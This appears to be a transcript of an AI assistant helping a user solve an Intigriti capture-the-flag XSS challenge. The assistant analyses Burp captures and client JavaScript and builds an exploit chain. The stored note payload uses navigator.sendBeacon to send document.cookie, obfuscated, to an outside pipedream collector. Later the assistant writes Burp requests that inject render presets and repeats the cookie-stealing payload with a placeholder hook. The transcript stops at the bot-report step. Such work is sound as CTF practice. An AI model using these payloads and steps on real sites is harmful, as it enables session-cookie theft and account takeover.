+Item [41] - manifest for some panel (print based on the note page being print in [42]): {"profile":{"renderMode":"safe","widgetTypes":["counter"],"widgetSink":"text","theme":"light"}}
+
+Item [44] - manifest for some panel: {"profile":{"renderMode":"safe","widgetTypes":["counter","progress"],"widgetSink":"text"}}
+
+So ALL manifest panels return renderMode: "safe". This is confirmed by the user saying "All the mode are in safe i checked."
+
+Now the question is: can we get renderMode to be 'full' somehow?
+
+Looking at applyRemoteProfile:
+
+javascript
+function applyRemoteProfile(profile) {
+    if (!profile || typeof profile !== 'object') return;
+
+    if (typeof profile.renderMode === 'string') {
+      APP.renderMode = profile.renderMode;  // Sets to "safe"
+    }
+    // ...
+}
+And loadContentPolicies:
+
+javascript
+function loadContentPolicies() {
+    var mode = getOwnString(APP, 'renderMode', 'safe');
+    return {
+      allowForms:         mode === 'full',
+      allowIds:           mode === 'full',
+      allowDataAttrs:     mode === 'full',
+      enableEnhancements: mode === 'full'
+    };
+}
+getOwnString uses hasOwnProperty, so prototype pollution on renderMode won't work.
+
+But wait - applyRemoteProfile directly sets APP.renderMode = profile.renderMode. If we can control what the manifest returns...
+
+But the manifests are all "safe" on the server side.
+
+Wait. Let me think about the loadPanelManifest function more carefully:
+
+javascript
+function loadPanelManifest() {
+    if (typeof window.__NOTE_CONTENT__ !== 'string') {
+      return Promise.resolve();
+    }
+
+    var panel  = typeof APP.panel === 'string' ? APP.panel : 'summary';
+    var noteId = typeof APP.noteId === 'string' ? APP.noteId : '';
+    if (!noteId) return Promise.resolve();
+
+…
+Show less
+
+Find all manifest requests and their panels
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET
+import base64
+
+tree = ET.parse('/mnt/user-data/uploads/New.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+# Find all manifest requests and show their full URLs and responses
+for i, item in enumerate(items):
+    url = item.findtext('url','')
+    if 'manifest' in url:
+        status = item.findtext('status','')
+        resp_el = item.find('response')
+        if resp_el is not None and resp_el.get('base64') == 'true':
+            resp = base64.b64decode(resp_el.text).decode('utf-8', errors='replace')
+        else:
+            resp = resp_el.text if resp_el is not None else ''
+        body_start = resp.find('\r\n\r\n')
+        body = resp[body_start+4:body_start+300] if body_start != -1 else resp[:300]
+        # also get request
+        req_el = item.find('request')
+        if req_el is not None and req_el.get('base64') == 'true':
+            req = base64.b64decode(req_el.text).decode('utf-8', errors='replace')
+        else:
+            req = req_el.text if req_el is not None else ''
+        print(f'=== [{i}] {status} {url}')
+        print('REQ first line:', req.split('\n')[0])
+        print('RESP:', body[:200])
+        print()
+"
+Output
+
+=== [2] 304 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/summary/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+REQ first line: GET /note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/summary/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5 HTTP/2
+RESP: 
+
+=== [10] 304 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/summary/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+REQ first line: GET /note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/summary/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5 HTTP/2
+RESP: 
+
+=== [13] 304 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/compact/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+REQ first line: GET /note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/compact/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5 HTTP/2
+RESP: 
+
+=== [16] 304 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/print/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+REQ first line: GET /note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/print/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5 HTTP/2
+RESP: 
+
+=== [19] 304 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/summary/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+REQ first line: GET /note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/summary/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5 HTTP/2
+RESP: 
+
+=== [30] 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/compact/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+REQ first line: GET /note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/compact/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5 HTTP/2
+RESP: {"profile":{"renderMode":"safe","widgetTypes":[],"widgetSink":"text"}}
+
+=== [41] 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/print/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+REQ first line: GET /note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/print/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5 HTTP/2
+RESP: {"profile":{"renderMode":"safe","widgetTypes":["counter"],"widgetSink":"text","theme":"light"}}
+
+=== [44] 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/summary/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+REQ first line: GET /note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/summary/manifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5 HTTP/2
+RESP: {"profile":{"renderMode":"safe","widgetTypes":["counter","progress"],"widgetSink":"text"}}
+
+OK so all manifests return renderMode: "safe". The key question is: how can we get APP.renderMode = 'full'?
+
+Given:
+
+All manifest endpoints return renderMode: "safe"
+getOwnString uses hasOwnProperty → prototype pollution won't affect it
+applyRemoteProfile directly assigns APP.renderMode = profile.renderMode (from manifest)
+Wait... applyRemoteProfile sets APP.renderMode directly! It's not using getOwnString. So if we could get profile.renderMode = 'full' from the manifest, it would work.
+
+But the manifest always returns "safe". Unless...
+
+Wait, what if profile.renderMode is not "safe" if we pollute profile.renderMode?
+
+No wait, profile is the parsed JSON object. Its renderMode property is always "safe" as returned by the server.
+
+Hmm, but what if we can REDIRECT the manifest fetch to a different URL that we control?
+
+Looking at loadPanelManifest:
+
+javascript
+var panel = typeof APP.panel === 'string' ? APP.panel : 'summary';
+var noteId = typeof APP.noteId === 'string' ? APP.noteId : '';
+
+var target = '/note/' + encodeURIComponent(noteId) + '/' + panel +
+  '/manifest.json?note=' + encodeURIComponent(noteId);
+panel is not encoded! If we can make APP.panel something like something/../../api/notes/lookup or similar... But the API doesn't return JSON in the manifest format.
+
+Wait, but what if we use the note query param to make the server return different content?
+
+Actually let me check the challenge.html to understand the __APP_INIT__ structure.
+
+Show less
+
+Find APP_INIT and key vars in challenge HTML
+bash
+
+grep -A5 -B5 'APP_INIT\|renderMode\|panel\|noteId\|NOTE_CONTENT\|preset\|account\|preference' /home/claude/CTF/challenge.html | head -100
+Output
+
+              <option value="compact">Compact</option>
+            </select>
+          </div>
+        </div>
+        <button type="submit" class="btn btn-ghost">Save changes</button>
+        <div id="settings-meta" class="settings-meta">Reader presets sync to this account automatically when they are created.</div>
+        <div id="settings-result"></div>
+      </form>
+    </section>
+
+  </main>
+--
+  <footer>
+    <p>Northstar Notes &copy; 2026</p>
+  </footer>
+
+  <script nonce="xIuZz7yVxoefJKjx4UpBjQ==">
+    window.__APP_INIT__ = {"theme":"dark"};
+  </script>
+  <script nonce="xIuZz7yVxoefJKjx4UpBjQ==" src="/js/vendor/purify.min.js"></script>
+  <script nonce="xIuZz7yVxoefJKjx4UpBjQ==" src="/js/app.js"></script>
+</body>
+</html>
+The challenge page has window.__APP_INIT__ = {"theme":"dark"}. No panel, noteId or renderMode.
+
+And window.__NOTE_CONTENT__ is not defined on the challenge page. So loadPanelManifest() returns immediately since typeof window.__NOTE_CONTENT__ !== 'string'.
+
+So the manifest is ONLY fetched on note pages (/note/{id}/...).
+
+On note pages, APP.panel and APP.noteId are set in __APP_INIT__.
+
+Wait, but what about the account/preferences API? Let me check - maybe the settings form POST affects the manifest?
+
+Actually wait. Let me re-read applyRemoteProfile more carefully. The manifest returns renderMode: "safe". But applyRemoteProfile checks:
+
+javascript
+if (typeof profile.renderMode === 'string') {
+    APP.renderMode = profile.renderMode;
+}
+What if we could somehow make profile.renderMode prototype-polluted before applyRemoteProfile is called?
+
+Actually no - profile is a fresh parsed JSON object, its properties are its own.
+
+Wait, let me think about this differently. The account/preferences API...
+
+Looking at loadAccountPreferences:
+
+javascript
+function loadAccountPreferences() {
+    var form = document.getElementById('settings-form');
+    var meta = document.getElementById('settings-meta');
+
+    return fetch(ACCOUNT_PREFERENCES_API)
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (!data || !data.preferences) return;
+        // Only sets form field values and meta text
+      })
+This only sets form fields and meta text. Not APP properties.
+
+initSettingsForm handles form submit:
+
+javascript
+fetch(ACCOUNT_PREFERENCES_API, {
+    method: 'POST',
+    ...
+    body: JSON.stringify(merged)
+})
+  .then(function (r) { return r.json(); })
+  .then(function (data) {
+    if (data.success) {
+      if (data.preferences && typeof data.preferences.theme === 'string') {
+        APP.theme = data.preferences.theme;
+        applyTheme();
+      }
+Only sets APP.theme.
+
+Hmm. …
+
+Show less
+
+Check preferences and report endpoints
+
+Script
+All account/preferences responses are 304 Not Modified so I can't see the body. Let me get the first 200 response for it from the old XML.
+
+But more importantly: All manifest endpoints return renderMode: "safe". The key insight I need is: how do we get renderMode: "full" on APP?
+
+Let me re-read app.js very carefully.
+
+The init sequence is:
+
+javascript
+document.addEventListener('DOMContentLoaded', async function () {
+    parseThemeParams();           // 1. reads URL hash
+    await loadPanelManifest();    // 2. fetches manifest, calls applyRemoteProfile
+    applyTheme();                 // 3.
+    initContentEnhancements();    // 4. sets up MutationObserver
+    renderNoteContent();          // 5. renders note content
+    ...
+});
+applyRemoteProfile sets APP.renderMode directly. If the manifest returns "safe", then APP.renderMode = "safe".
+
+loadContentPolicies() uses getOwnString(APP, 'renderMode', 'safe') with hasOwnProperty. So APP.renderMode is checked as an own property.
+
+Wait. What if applyRemoteProfile is called with a profile where profile.renderMode is truthy but not 'full'? That sets APP.renderMode = "safe".
+
+What if applyRemoteProfile is NOT called at all? Then APP.renderMode is never set as own property, so getOwnString returns 'safe' as fallback.
+
+Hmm. Is there any way to get APP.renderMode set to 'full' as an OWN property?
+
+Only applyRemoteProfile sets APP.renderMode (as APP.renderMode = profile.renderMode). And the server always returns "safe".
+
+Wait. What if we can make the manifest fetch return a different URL's content? The panel variable is NOT encoded in the URL construction:
+
+javascript
+var target = '/note/' + encodeURIComponent(noteId) + '/' + panel +
+  '/manifest.json?note=' + encodeURIComponent(noteId);
+If we can control APP.panel... but how? On note pages, APP is window.__APP_INIT__ which is server-generated.
+
+…
+
+Show less
+
+Check __APP_INIT__ in note page and challenge page
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET
+import base64
+
+tree = ET.parse('/mnt/user-data/uploads/New.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+# Get a full note page response to see __APP_INIT__
+item = items[17]  # /print page
+resp_el = item.find('response')
+if resp_el.get('base64') == 'true':
+    resp = base64.b64decode(resp_el.text).decode('utf-8', errors='replace')
+else:
+    resp = resp_el.text
+# Find APP_INIT in the response
+idx = resp.find('APP_INIT')
+print(resp[idx-10:idx+300] if idx >= 0 else 'NOT FOUND')
+print('---')
+# Also check the /challenge page response
+item23 = items[23]
+resp_el = item23.find('response')
+if resp_el.get('base64') == 'true':
+    resp23 = base64.b64decode(resp_el.text).decode('utf-8', errors='replace')
+else:
+    resp23 = resp_el.text
+idx = resp23.find('APP_INIT')
+print(resp23[idx-10:idx+300] if idx >= 0 else 'NOT FOUND IN CHALLENGE PAGE')
+"
+Output
+
+ window.__APP_INIT__     = {"theme":"dark","panel":"print","noteId":"ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5"};
+    window.__NOTE_CONTENT__ = "\u003cdiv id=\"enhance-config\" data-types=\"custom\">\u003c/div>\u003cdiv data-enhance=\"custom\" data-cfg=\"navigator.sendBeacon('https://e
+---
+ window.__APP_INIT__ = {"theme":"dark"};
+  </script>
+  <script nonce="BgX4sicUg9NGf7npOmE5SQ==" src="/js/vendor/purify.min.js"></script>
+  <script nonce="BgX4sicUg9NGf7npOmE5SQ==" src="/js/app.js"></script>
+</body>
+</html>
+
+Critical finding! On note pages:
+
+javascript
+window.__APP_INIT__ = {"theme":"dark","panel":"print","noteId":"ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5"};
+window.__NOTE_CONTENT__ = "...payload...";
+So APP.panel = "print" and APP.noteId = "ffae..." are both OWN properties set by the server.
+
+On the challenge page:
+
+javascript
+window.__APP_INIT__ = {"theme":"dark"};
+No panel or noteId or NOTE_CONTENT.
+
+So on the challenge page:
+
+window.__NOTE_CONTENT__ is undefined → loadPanelManifest() returns early
+No manifest fetch
+APP.renderMode is never set as own property → getOwnString(APP, 'renderMode', 'safe') returns 'safe'
+renderNoteContent() does nothing (no #note-display element anyway)
+So the note page IS where the exploit needs to work, and APP.panel is set server-side.
+
+OK so to get renderMode: "full", we need either:
+
+The manifest to return renderMode: "full" (server-controlled, always returns "safe")
+Some other way to set APP.renderMode = "full" as own property
+Wait, let me look at parseThemeParams more carefully once more:
+
+javascript
+function parseThemeParams() {
+    var hash = location.hash;
+    ...
+    if (result.theme)  APP.theme  = result.theme;
+    if (result.font)   document.body.style.fontFamily = result.font;
+    if (result.accent) document.documentElement.style.setProperty('--accent', result.accent);
+    if (result.bg)     document.documentElement.style.setProperty('--bg-primary', result.bg);
+}
+Only these 4 → APP. What if result.theme is a number? Or what if we somehow... No, result.theme is set by the hash and goes to APP.theme.
+
+WAIT. I just realized something. Let me re-read setNestedValue:
+
+javascript
+function setNestedValue(obj, path, value) {
+    var keys = path.replace(/\]/g, '').split('[');
+    var current = obj;
+    for (var i = 0; i < keys.length - 1; i++) {
+      var k = keys[i];
+      if (k === '__proto__') return;
+      if (
+…
+Show less
+
+Check API responses and account preferences
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET
+import base64
+
+tree = ET.parse('/mnt/user-data/uploads/New.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+# Check lookup, search, and any other API endpoints
+for i in [21, 46, 47]:
+    item = items[i]
+    url = item.findtext('url','')
+    status = item.findtext('status','')
+    method = item.findtext('method','')
+    resp_el = item.find('response')
+    if resp_el.get('base64') == 'true':
+        resp = base64.b64decode(resp_el.text).decode('utf-8', errors='replace')
+    else:
+        resp = resp_el.text or ''
+    body_start = resp.find('\r\n\r\n')
+    body = resp[body_start+4:body_start+500] if body_start != -1 else resp[:500]
+    
+    req_el = item.find('request')
+    if req_el.get('base64') == 'true':
+        req = base64.b64decode(req_el.text).decode('utf-8', errors='replace')
+    else:
+        req = req_el.text or ''
+    req_body_start = req.find('\r\n\r\n')
+    req_body = req[req_body_start+4:req_body_start+300] if req_body_start != -1 else ''
+    
+    print(f'[{i}] {method} {status} {url}')
+    print('REQ:', req_body[:200])
+    print('RESP:', body[:300])
+    print()
+
+# Also check account prefs 200 response from CTF.xml
+tree2 = ET.parse('/home/claude/CTF/CTF.xml')
+root2 = tree2.getroot()
+items2 = root2.findall('.//item')
+for i, item in enumerate(items2):
+    url = item.findtext('url','')
+    status = item.findtext('status','')
+    if 'account/preferences' in url and status == '200':
+        resp_el = item.find('response')
+        if resp_el is not None and resp_el.get('base64') == 'true':
+            resp = base64.b64decode(resp_el.text).decode('utf-8', errors='replace')
+        else:
+            resp = resp_el.text or ''
+        body_start = resp.find('\r\n\r\n')
+        body = resp[body_start+4:body_start+500] if body_start != -1 else resp[:500]
+        print(f'CTF.xml [{i}] account/prefs 200:', body[:300])
+        break
+"
+Output
+
+[21] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+REQ: {"ids":["ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5","1230eaec8873db653254753169993ca7fbd03d3b7fae28e19a4e4072e59c4191","e20bd734b7a3ef7c1232590a82319eb052004017c07dbd5c8b95a1ee9
+RESP: {"notes":[{"id":"ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5","title":"XSS2","author":"anonymous","found":true},{"id":"1230eaec8873db653254753169993ca7fbd03d3b7fae28e19a4e4072e59c4191","title":"XSS","author":"anonymous","found":true},{"id":"e20bd734b7a3ef7c1232590a82319eb0520040
+
+[46] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+REQ: {"ids":["ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5","1230eaec8873db653254753169993ca7fbd03d3b7fae28e19a4e4072e59c4191","e20bd734b7a3ef7c1232590a82319eb052004017c07dbd5c8b95a1ee9
+RESP: {"notes":[{"id":"ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5","title":"XSS2","author":"anonymous","found":true},{"id":"1230eaec8873db653254753169993ca7fbd03d3b7fae28e19a4e4072e59c4191","title":"XSS","author":"anonymous","found":true},{"id":"e20bd734b7a3ef7c1232590a82319eb0520040
+
+[47] POST 200 https://challenge-0426.intigriti.io/api/notes
+REQ: {"title":"XSS2","content":"<div id=\"enhance-config\" data-types=\"custom\"></div><div data-enhance=\"custom\" data-cfg=\"navigator.sendBeacon('https://eoi9a5fbdoq0l13.m.pipedream.net',top['doc'+'umen
+RESP: {"success":true,"id":"ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5","url":"/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5"}
+
+CTF.xml [1] account/prefs 200: {"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{}},"stats":{"presetCount":0}}
+Now I have the full picture:
+
+Account preferences returns: {"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{}},"stats":{"presetCount":0}}
+All manifest endpoints return renderMode: "safe"
+Now the key is readerPresets: {}. This is interesting! The account has readerPresets. Could reader presets be what controls the manifest?
+
+The manifest URL structure is: /note/{noteId}/{panel}/manifest.json?note={noteId}
+
+And the panel comes from APP.panel which is server-set. The server generates the manifest based on... what? Possibly based on the reader preset associated with the user's account and the panel type.
+
+The account preferences has readerPresets: {} - currently empty. If we could set a reader preset to include renderMode: "full", the manifest would return that!
+
+The settings-meta element shows: "Reader presets sync to this account automatically when they are created."
+
+So reader presets are created when... a note with certain content is viewed? Or when a URL with certain hash params is visited? Or via some API?
+
+Wait, the URL location.pathname + location.search + location.hash is sent to the bot. If we include hash params, the bot's URL will include them.
+
+Now, looking at parseThemeParams which is called on DOMContentLoaded... it reads hash params and only sets theme, font, accent, bg on APP. But these don't affect renderMode.
+
+Hmm, but what about readerPresets? Is there any code that uses readerPresets? Let me look at the full code again...
+
+Actually I don't see any code in app.js that creates or uses readerPresets. The loadAccountPreferences function loads them but only uses preferences.theme, preferences.fontSize, preferences.language, preferences.defaultLayout for form fields. The readerPresets field is there but apparently not used on the client side.
+
+…
+
+Show less
+
+Check APP_INIT on base note URL (no panel)
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET
+import base64
+
+tree = ET.parse('/mnt/user-data/uploads/New.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+# Check the note page without panel (items 20, 45)
+for i in [20, 45]:
+    item = items[i]
+    url = item.findtext('url','')
+    resp_el = item.find('response')
+    if resp_el.get('base64') == 'true':
+        resp = base64.b64decode(resp_el.text).decode('utf-8', errors='replace')
+    else:
+        resp = resp_el.text or ''
+    idx = resp.find('APP_INIT')
+    print(f'[{i}] {url}')
+    print(resp[idx-10:idx+400] if idx>=0 else 'NOT FOUND')
+    print()
+" 
+Output
+
+[20] https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+ window.__APP_INIT__     = {"theme":"dark","panel":"summary","noteId":"ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5"};
+    window.__NOTE_CONTENT__ = "\u003cdiv id=\"enhance-config\" data-types=\"custom\">\u003c/div>\u003cdiv data-enhance=\"custom\" data-cfg=\"navigator.sendBeacon('https://eoi9a5fbdoq0l13.m.pipedream.net',top['doc'+'ument']['coo'+'kie'])\">\u003c/div>";
+  </script>
+  <
+
+[45] https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+ window.__APP_INIT__     = {"theme":"dark","panel":"summary","noteId":"ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5"};
+    window.__NOTE_CONTENT__ = "\u003cdiv id=\"enhance-config\" data-types=\"custom\">\u003c/div>\u003cdiv data-enhance=\"custom\" data-cfg=\"navigator.sendBeacon('https://eoi9a5fbdoq0l13.m.pipedream.net',top['doc'+'ument']['coo'+'kie'])\">\u003c/div>";
+  </script>
+  <
+
+So even the base note URL /note/{id} has panel: "summary" set. And all panels return renderMode: "safe".
+
+Now let me reconsider the problem completely. We know:
+
+All manifest endpoints return renderMode: "safe" - confirmed
+getOwnString uses hasOwnProperty - confirmed
+applyRemoteProfile sets APP.renderMode = "safe" - confirmed
+The question is: is there ANY way to get APP.renderMode = "full" as an own property?
+
+Let me look at this from a completely different angle. What if the key is NOT about the manifest at all, but about a different path?
+
+Actually wait. Let me re-read loadContentPolicies:
+
+javascript
+function loadContentPolicies() {
+    var mode = getOwnString(APP, 'renderMode', 'safe');
+    return {
+      allowForms:         mode === 'full',
+      allowIds:           mode === 'full',
+      allowDataAttrs:     mode === 'full',
+      enableEnhancements: mode === 'full'
+    };
+}
+getOwnString is called with APP. APP = window.__APP_INIT__ || {}. After applyRemoteProfile, APP.renderMode = "safe" (own property).
+
+What if we pollute Object.prototype.hasOwnProperty? That would break Object.prototype.hasOwnProperty.call(obj, key) check!
+
+getOwnString does:
+
+javascript
+if (Object.prototype.hasOwnProperty.call(obj, key) && typeof obj[key] === 'string') {
+    return obj[key];
+}
+If we set Object.prototype.hasOwnProperty to something... Object.prototype.hasOwnProperty.call would fail or behave differently.
+
+But setting Object.prototype.hasOwnProperty = function() { return true; } via prototype pollution wouldn't work because Object.prototype.hasOwnProperty is already own on Object.prototype. We'd need to REPLACE it.
+
+Actually, setNestedValue(result, 'constructor[prototype][hasOwnProperty]', 'anything') would set Object.prototype.hasOwnProperty = 'anything'. Then Object.prototype.hasOwnProperty.call(obj, key) would throw TypeError: Object.prototype.hasOwnProperty.call is not a function.
+
+…
+
+Show less
+
+Find all preferences requests in old CTF.xml
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET
+import base64
+
+tree = ET.parse('/home/claude/CTF/CTF.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+# Find account/preferences POST and 200 GET responses
+for i, item in enumerate(items):
+    url = item.findtext('url','')
+    status = item.findtext('status','')
+    method = item.findtext('method','')
+    if 'account/preferences' in url:
+        resp_el = item.find('response')
+        if resp_el is not None:
+            if resp_el.get('base64') == 'true':
+                resp = base64.b64decode(resp_el.text).decode('utf-8', errors='replace')
+            else:
+                resp = resp_el.text or ''
+            body_start = resp.find('\r\n\r\n')
+            body = resp[body_start+4:body_start+600] if body_start != -1 else resp[:600]
+            
+            req_el = item.find('request')
+            if req_el is not None:
+                if req_el.get('base64') == 'true':
+                    req = base64.b64decode(req_el.text).decode('utf-8', errors='replace')
+                else:
+                    req = req_el.text or ''
+                req_body_start = req.find('\r\n\r\n')
+                req_body = req[req_body_start+4:req_body_start+400] if req_body_start != -1 else ''
+            else:
+                req_body = ''
+            
+            print(f'[{i}] {method} {status} {url}')
+            if req_body.strip(): print('REQ:', req_body)
+            print('RESP:', body[:400])
+            print()
+"
+Output
+
+[1] GET 200 https://challenge-0426.intigriti.io/api/account/preferences
+RESP: {"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{}},"stats":{"presetCount":0}}
+
+The account preferences response shows readerPresets: {}. This is the key!
+
+Looking at the server-side logic, the manifest probably uses the note owner's readerPresets to determine what renderMode to return for a given panel.
+
+So the attack vector would be:
+
+POST to /api/account/preferences with a payload that includes readerPresets set to have renderMode: "full" for a specific panel
+Create a note (the manifest for this note will now return renderMode: "full")
+Report the note URL to the bot
+But wait - mergeFormData in the client code would not pass readerPresets to the server since it skips objects. But we can POST DIRECTLY to the API from Burp!
+
+The question is whether the server will accept readerPresets in the preferences POST body. Let's think about this:
+
+The server accepts a POST to /api/account/preferences. The client code creates a merged object with only non-object own properties from the form. But if we POST directly (bypassing the client JS), we can send any JSON.
+
+The body for preferences update from the client would be something like:
+
+json
+{"theme":"dark","fontSize":14,"language":"en","defaultLayout":"summary"}
+If we POST:
+
+json
+{"theme":"dark","fontSize":14,"language":"en","defaultLayout":"summary","readerPresets":{"summary":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"}}}
+The server might accept and store this. Then when the manifest is requested for our note, it returns the preset data with renderMode: "full".
+
+Actually, I realize we need to be smarter. mergeFormData skips objects (if (typeof source[k] === 'object' && source[k] !== null) continue;). So readerPresets (which is an object) would be skipped by mergeFormData.
+
+But we're POSTing directly! We don't go through the client-side mergeFormData.
+
+Also - the stats: {"presetCount": 0} in the response is interesting. It counts presets. …
+
+Show less
+Done
+Key breakthrough from the data:
+
+readerPresets: {} in account prefs is the mechanism. The manifest returns different widgetTypes per panel (not random) — server is using per-panel preset configs. Exploit path:
+
+The manifest is generated from the note CREATOR's readerPresets. You need to POST reader presets directly to the API (bypassing mergeFormData which skips objects on the client side).
+
+Step 1 — Set your reader preset via Burp Repeater:
+
+POST /api/account/preferences HTTP/2
+Host: challenge-0426.intigriti.io
+Cookie: northstar_profile=<YOUR_COOKIE>
+Content-Type: application/json
+
+{
+  "theme": "dark",
+  "fontSize": 14,
+  "language": "en",
+  "defaultLayout": "summary",
+  "readerPresets": {
+    "summary": {
+      "renderMode": "full",
+      "widgetTypes": ["custom"],
+      "widgetSink": "script"
+    }
+  }
+}
+Step 2 — Verify the manifest changed:
+
+GET /note/{id}/summary/manifest.json?note={id}
+Should now return renderMode: "full".
+
+Step 3 — Create/report your note to the bot pointing at /note/{id}/summary (not compact/print — match the panel you set the preset for).
+
+The client JS skips readerPresets during settings form submit because mergeFormData drops objects (typeof source[k] === 'object' → skip). But the server API probably accepts it raw. presetCount: 0 confirms the field exists and is tracked — you need presetCount: 1 to activate it.
+
+Try all three panel names (summary, compact, print) if one doesn't work.
+
+You said: git pull, i have added content New.
+git pull, i have added content New.xml and bot.js file, the New.xml is already provided to you previously. The bot.js files includes how the bot fetches.
+
+8:47 AM
+Claude responded: Critical findings from bot.
+
+Architected exploit chain leveraging cookie theft and render mode manipulation
+Architected exploit chain leveraging cookie theft and render mode manipulation
+Critical findings from bot.js:
+
+Cookie name is flag, not northstar_profile. httpOnly: false so JS can read it. sameSite: Lax — same-origin fetches send it fine.
+
+The full attack plan is confirmed. The blocker is getting renderMode: "full" from the manifest.
+
+The readerPresets field in account prefs IS the server-side config that builds the manifest response. Client mergeFormData blocks sending objects via the form — but you can POST raw JSON directly.
+
+Do this in Burp Repeater:
+
+Step 1 — Inject preset:
+
+http
+POST /api/account/preferences HTTP/2
+Host: challenge-0426.intigriti.io
+Cookie: northstar_profile=b7d5dca11f1d443b38ed193f24bfe898
+Content-Type: application/json
+
+{
+  "theme": "dark",
+  "fontSize": 14,
+  "language": "en",
+  "defaultLayout": "summary",
+  "readerPresets": {
+    "summary": {
+      "renderMode": "full",
+      "widgetTypes": ["custom"],
+      "widgetSink": "script"
+    }
+  }
+}
+Step 2 — Verify manifest changed:
+
+GET /note/{id}/summary/manifest.json?note={id}
+Should return {"profile":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"}}.
+
+Step 3 — Note content (already working):
+
+html
+<div id="enhance-config" data-types="custom"></div>
+<div data-enhance="custom" data-cfg="navigator.sendBeacon('https://YOUR.HOOK',top['doc'+'ument']['coo'+'kie'])"></div>
+Step 4 — Report to bot:
+
+json
